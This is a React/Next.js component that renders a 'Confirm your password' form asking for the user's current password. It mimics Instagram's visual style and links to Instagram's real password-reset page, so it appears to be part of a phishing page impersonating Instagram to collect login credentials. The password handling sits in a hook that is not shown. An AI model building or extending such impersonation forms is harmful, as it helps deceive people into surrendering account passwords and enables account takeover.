// src/components/password/ConfirmPasswordForm.tsx
"use client";

import { useConfirmPassword } from "@/hooks/useConfirmPassword";
import PasswordInput from "@/components/ui/PasswordInput";

export default function ConfirmPasswordForm() {
  const { password, setPassword, error, clearError, loading, handleSubmit } =
    useConfirmPassword();

  return (
    <>
      <h1
        style={{
          color: "#fff",
          fontSize: 21,
          fontWeight: 700,
          marginBottom: 9,
          lineHeight: 1.3,
        }}
      >
        Confirm your password
      </h1>
      <p
        style={{
          color: "#a8a8a8",
          fontSize: 13.5,
          lineHeight: 1.6,
          marginBottom: 26,
          maxWidth: 430,
        }}
      >
        To continue, please enter your current password to verify it&apos;s you.
      </p>

      <PasswordInput
        placeholder="Current password"
        value={password}
        error={error}
        disabled={loading}
        onChange={(e) => {
          setPassword(e.target.value);
          if (error) clearError();
        }}
        onKeyDown={(e) => {
          if (e.key === "Enter") handleSubmit();
        }}
      />

      <a
        href="https://www.instagram.com/accounts/password/reset/"
        target="_blank"
        rel="noopener noreferrer"
        style={{
            display: "inline-block",
            color: "#0095f6",
            fontSize: 13,
            textDecoration: "none",
            marginBottom: 22,
            transition: "color 0.15s",
        }}
        onMouseEnter={(e) =>
            ((e.target as HTMLAnchorElement).style.color = "#1aa3ff")
        }
        onMouseLeave={(e) =>
            ((e.target as HTMLAnchorElement).style.color = "#0095f6")
        }
      >
        Forgot your password?
      </a>

      <button
        onClick={handleSubmit}
        disabled={loading}
        style={{
          width: "100%",
          padding: "14px",
          backgroundColor: loading ? "#0070b8" : "#0095f6",
          color: "#fff",
          fontSize: 15.5,
          fontWeight: 600,
          border: "none",
          borderRadius: 50,
          cursor: loading ? "not-allowed" : "pointer",
          letterSpacing: 0.15,
          transition: "background-color 0.15s, transform 0.1s",
          boxShadow: "0 2px 14px rgba(0,149,246,0.22)",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          gap: 8,
        }}
        onMouseEnter={(e) => {
          if (loading) return;
          const btn = e.currentTarget;
          btn.style.backgroundColor = "#1aa3ff";
          btn.style.transform = "scale(1.01)";
        }}
        onMouseLeave={(e) => {
          if (loading) return;
          const btn = e.currentTarget;
          btn.style.backgroundColor = "#0095f6";
          btn.style.transform = "scale(1)";
        }}
        onMouseDown={(e) => {
          if (!loading) e.currentTarget.style.transform = "scale(0.98)";
        }}
        onMouseUp={(e) => {
          if (!loading) e.currentTarget.style.transform = "scale(1.01)";
        }}
      >
        {loading ? (
          <>
            <svg
              width="16"
              height="16"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2.5"
              strokeLinecap="round"
              style={{ animation: "spin 0.7s linear infinite" }}
            >
              <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83" />
            </svg>
            Verifying...
          </>
        ) : (
          "Continue"
        )}
      </button>

      <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
    </>
  );
}